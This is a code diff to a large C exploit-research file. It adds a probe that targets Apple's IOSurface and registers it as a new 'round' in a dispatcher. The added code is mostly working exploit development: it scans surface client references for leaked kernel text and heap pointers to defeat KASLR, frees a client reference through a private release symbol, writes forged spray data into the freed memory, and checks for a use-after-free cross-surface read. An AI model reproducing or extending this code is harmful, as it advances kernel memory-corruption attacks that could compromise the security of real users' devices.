@@ -15902,6 +15902,276 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r382: UAF-based vtable pointer leak for KASLR bypass.
+ * Strategy:
+ * 1. Create surfaces A, B with original 4096-byte alloc (kptr verified in r354-r356)
+ * 2. Read kptr from client ref +88 for each surface
+ * 3. Try IOSurface UAF: free A, spray to reclaim with controlled data containing B's sid at +136
+ * 4. Use stale ptr to CopyValue on surface B — read B's properties through A's freed client
+ * 5. If we can set a property whose VALUE in the kernel contains the IOSurface vtable ptr...
+ *    → Set a property on B, then free B's kernel object, allocate a NEW C → C takes B's slot
+ *    → Read the property back — if the kernel didn't zero the OSDictionary entry, we might
+ *      read stale kernel data
+ *
+ * Also: scan more offsets in client ref for any leaked kernel text pointers.
+ * The kptr at +88 is a kernel HEAP ptr. We need to find kernel TEXT.
+ */
+static void r382_probe(void) {
+    rlog("\n=== r382: UAF Vtable Leak + Client Ref Full Scan ===\n\n");
+    fflush(stdout);
+
+    /* Create surfaces with the ORIGINAL parameters that worked in r354-r356 */
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    /* Part 1: Full client ref scan for ALL 10 surfaces */
+    rlog("--- Part 1: Full client ref scan (10 surfaces) ---\n");
+    fflush(stdout);
+
+    IOSurfaceRef surfs[10];
+    for (int i = 0; i < 10; i++) {
+        surfs[i] = IOSurfaceCreate(props);
+    }
+
+    for (int i = 0; i < 10; i++) {
+        uint8_t *cref = (uint8_t*)surfs[i];
+        uint32_t sid = IOSurfaceGetID(surfs[i]);
+        rlog("  Surface %d (sid=%u):\n", i, sid);
+
+        /* Scan entire 448-byte client ref for kernel-range values */
+        int ktext_found = 0, kheap_found = 0;
+        for (int off = 0; off < 448; off += 8) {
+            uint64_t v;
+            memcpy(&v, cref + off, 8);
+            if (v >= 0xfffffff000000000ULL && v <= 0xfffffff7ffffffffULL) {
+                rlog("    +%3d: 0x%016llx  KTEXT!\n", off, (unsigned long long)v);
+                ktext_found++;
+            } else if (v >= 0xffffffe000000000ULL && v < 0xfffffff000000000ULL) {
+                rlog("    +%3d: 0x%016llx  KHEAP\n", off, (unsigned long long)v);
+                kheap_found++;
+            }
+        }
+        if (!ktext_found && !kheap_found) {
+            /* Just show offset 88 regardless */
+            uint64_t v88;
+            memcpy(&v88, cref + 88, 8);
+            rlog("    +88: 0x%016llx  (no ktext/kheap found)\n", (unsigned long long)v88);
+        }
+
+        /* Also dump a hex view of first 128 bytes for structure analysis */
+        if (i == 0) {
+            rlog("    Hex dump of first 256 bytes:\n");
+            for (int row = 0; row < 256; row += 32) {
+                rlog("    +%3d:", row);
+                for (int col = 0; col < 32; col += 8) {
+                    uint64_t v;
+                    memcpy(&v, cref + row + col, 8);
+                    rlog(" %016llx", (unsigned long long)v);
+                }
+                rlog("\n");
+            }
+        }
+    }
+
+    /* Part 2: Try IOSurface backing store to read kernel memory */
+    rlog("\n--- Part 2: Backing store content analysis ---\n");
+    fflush(stdout);
+
+    /* Lock surface 0 and check if backing store contains kernel residue */
+    IOSurfaceLock(surfs[0], 0, NULL);
+    void *base = IOSurfaceGetBaseAddress(surfs[0]);
+    size_t allocsz = IOSurfaceGetAllocSize(surfs[0]);
+    rlog("  Surface 0 base=%p allocSize=%zu\n", base, allocsz);
+
+    if (base && allocsz > 0) {
+        int found = 0;
+        for (size_t off = 0; off + 7 < allocsz; off += 8) {
+            uint64_t v;
+            memcpy(&v, (uint8_t*)base + off, 8);
+            if (v >= 0xfffffff000000000ULL && v <= 0xfffffff7ffffffffULL) {
+                rlog("    +%zu: 0x%llx KTEXT!\n", off, (unsigned long long)v);
+                found++;
+                if (found >= 10) break;
+            } else if (v >= 0xffffffe000000000ULL && v < 0xfffffff000000000ULL) {
+                rlog("    +%zu: 0x%llx KHEAP\n", off, (unsigned long long)v);
+                found++;
+                if (found >= 10) break;
+            }
+        }
+        if (!found) rlog("    No kernel pointers in backing store\n");
+    }
+    IOSurfaceUnlock(surfs[0], 0, NULL);
+
+    /* Part 3: Create/destroy cycle to look for vtable residue */
+    rlog("\n--- Part 3: Surface create/destroy residue scan ---\n");
+    fflush(stdout);
+
+    /* Allocate a large region and check for residue after freeing surfaces */
+    IOSurfaceRef temp_surfs[100];
+    for (int i = 0; i < 100; i++) temp_surfs[i] = IOSurfaceCreate(props);
+
+    /* Record their client ref addresses */
+    uint8_t *first_cref = (uint8_t*)temp_surfs[0];
+    uint8_t *last_cref = (uint8_t*)temp_surfs[99];
+    rlog("  Created 100 temp surfaces: first=%p last=%p\n", first_cref, last_cref);
+
+    /* Free them all */
+    for (int i = 0; i < 100; i++) CFRelease(temp_surfs[i]);
+    rlog("  Freed 100 surfaces\n");
+
+    /* Now allocate new memory in the same region and check for residue */
+    void *scan_buf = malloc(448 * 100);
+    memset(scan_buf, 0, 448 * 100);  /* malloc may give us the freed surface memory */
+    rlog("  Allocated scan buffer at %p\n", scan_buf);
+
+    /* Check if the buffer landed in the freed surface region */
+    int in_range = ((uint8_t*)scan_buf >= first_cref - 448*100 &&
+                    (uint8_t*)scan_buf <= last_cref + 448*100);
+    rlog("  In freed region: %s\n", in_range ? "YES" : "NO");
+
+    /* Scan for any kernel pointers in the buffer */
+    int residue = 0;
+    for (size_t off = 0; off + 7 < 448*100; off += 8) {
+        uint64_t v;
+        memcpy(&v, (uint8_t*)scan_buf + off, 8);
+        if (v >= 0xfffffff000000000ULL && v <= 0xfffffff7ffffffffULL) {
+            rlog("    +%zu: 0x%llx KTEXT RESIDUE!\n", off, (unsigned long long)v);
+            residue++;
+            if (residue >= 10) break;
+        }
+    }
+    if (!residue) rlog("    No kernel text residue in malloc buffer\n");
+    free(scan_buf);
+
+    /* Part 4: IOSurface UAF — verify kptr presence + cross-surface read */
+    rlog("\n--- Part 4: UAF cross-surface kptr verification ---\n");
+    fflush(stdout);
+
+    IOSurfaceRef uaf_a = IOSurfaceCreate(props);
+    IOSurfaceRef uaf_b = IOSurfaceCreate(props);
+    IOSurfaceRef uaf_c = IOSurfaceCreate(props);
+    uint32_t sid_a = IOSurfaceGetID(uaf_a);
+    uint32_t sid_b = IOSurfaceGetID(uaf_b);
+    uint32_t sid_c = IOSurfaceGetID(uaf_c);
+
+    uint8_t *ca = (uint8_t*)uaf_a;
+    uint64_t kpa, kpb, kpc;
+    memcpy(&kpa, ca + 88, 8);
+    memcpy(&kpb, (uint8_t*)uaf_b + 88, 8);
+    memcpy(&kpc, (uint8_t*)uaf_c + 88, 8);
+
+    rlog("  UAF A: sid=%u kptr=0x%llx\n", sid_a, (unsigned long long)kpa);
+    rlog("  UAF B: sid=%u kptr=0x%llx\n", sid_b, (unsigned long long)kpb);
+    rlog("  UAF C: sid=%u kptr=0x%llx\n", sid_c, (unsigned long long)kpc);
+
+    /* Check if kptrs are in valid kernel heap range */
+    int kpa_valid = (kpa >= 0xffffffe000000000ULL && kpa < 0xfffffff000000000ULL);
+    int kpb_valid = (kpb >= 0xffffffe000000000ULL && kpb < 0xfffffff000000000ULL);
+    rlog("  kpa valid KHEAP: %s\n", kpa_valid ? "YES" : "NO");
+    rlog("  kpb valid KHEAP: %s\n", kpb_valid ? "YES" : "NO");
+
+    /* Set a property on B that we'll try to read through UAF */
+    int bval = 0xDEAD382;
+    CFNumberRef bnum = CFNumberCreate(NULL, kCFNumberIntType, &bval);
+    IOSurfaceSetValue(uaf_b, CFSTR("UAFTest"), bnum);
+    CFRelease(bnum);
+
+    /* Dump UAF A client ref offsets 80-144 */
+    rlog("  UAF A client ref [80..144]:\n");
+    for (int off = 80; off <= 144; off += 8) {
+        uint64_t v;
+        memcpy(&v, ca + off, 8);
+        rlog("    +%d: 0x%016llx\n", off, (unsigned long long)v);
+    }
+
+    /* Free A's client ref (double-free: release + CFRelease) */
+    IOSurfaceRef uaf_a_hold = uaf_a;  /* Keep the pointer */
+    /* First release via IOSurfaceClientRelease (private) */
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+    if (clientRelease) {
+        rlog("  IOSurfaceClientRelease found\n");
+        clientRelease(uaf_a);
+        /* Check if memory is still accessible */
+        uint64_t v88_after;
+        memcpy(&v88_after, ca + 88, 8);
+        rlog("  After clientRelease, +88=0x%llx\n", (unsigned long long)v88_after);
+
+        /* Now write spray data: forge sid_b at +136, kptr_b at +88 */
+        uint8_t spray[448];
+        memset(spray, 0, sizeof(spray));
+        /* +88: B's kernel heap ptr */
+        memcpy(spray + 88, &kpb, 8);
+        /* +136: B's surface ID */
+        memcpy(spray + 136, &sid_b, 4);
+        /* +112: original base address (keep it valid) */
+        uint64_t orig_base = 0;
+        memcpy(&orig_base, ca + 112, 8);
+        memcpy(spray + 112, &orig_base, 8);
+
+        /* Direct write to freed memory */
+        memcpy(ca, spray, 448);
+        rlog("  Wrote spray data to freed client ref\n");
+
+        /* Verify the write */
+        uint64_t v88_check, v136_check;
+        memcpy(&v88_check, ca + 88, 8);
+        uint32_t sid_check;
+        memcpy(&sid_check, ca + 136, 4);
+        rlog("  Verify: +88=0x%llx (want 0x%llx) +136=%u (want %u)\n",
+            (unsigned long long)v88_check, (unsigned long long)kpb,
+            sid_check, sid_b);
+
+        /* Try CopyValue through stale ptr — should read B's property */
+        CFTypeRef rv = IOSurfaceCopyValue(uaf_a_hold, CFSTR("UAFTest"));
+        if (rv) {
+            if (CFGetTypeID(rv) == CFNumberGetTypeID()) {
+                int read_val = 0;
+                CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &read_val);
+                rlog("  CopyValue('UAFTest') through stale ptr: 0x%x (want 0xDEAD382)\n",
+                    read_val);
+                if (read_val == 0xDEAD382) {
+                    rlog("  *** UAF CROSS-SURFACE READ CONFIRMED! ***\n");
+                }
+            }
+            CFRelease(rv);
+        } else {
+            rlog("  CopyValue('UAFTest') through stale ptr: NULL\n");
+        }
+    } else {
+        rlog("  IOSurfaceClientRelease NOT found — trying CFRelease only\n");
+        CFRelease(uaf_a);
+        /* After single CFRelease, refcount drops from 2 to 1 — still alive */
+        uint64_t v88_after;
+        memcpy(&v88_after, ca + 88, 8);
+        rlog("  After CFRelease, +88=0x%llx (still alive, refcount=1)\n",
+            (unsigned long long)v88_after);
+    }
+
+    CFRelease(uaf_b);
+    CFRelease(uaf_c);
+
+    /* Cleanup */
+    for (int i = 0; i < 10; i++) CFRelease(surfs[i]);
+    CFRelease(props);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+
+    rlog("\n=== r382 complete ===\n");
+    fflush(stdout);
+}
+
 /* r381: Data-only kernel R/W attempt.
  * Strategy: Use IOSurface UAF to build primitives WITHOUT KASLR bypass.
  *
@@ -59020,6 +59290,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 385) {
+            rlog("*** rounds=385: UAF Vtable Leak + Client Ref Full Scan ***\n");
+            rlog("  Full 448-byte scan, backing store residue, UAF cross-surface.\n\n");
+            fflush(stdout);
+            r382_probe();
+            goto done;
+        }
         if (rounds == 384) {
             rlog("*** rounds=384: Data-Only Kernel R/W Attempt ***\n");
             rlog("  IOSurface selector probing, pipe buffers, kernel mem access.\n\n");
@@ -61300,7 +61577,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
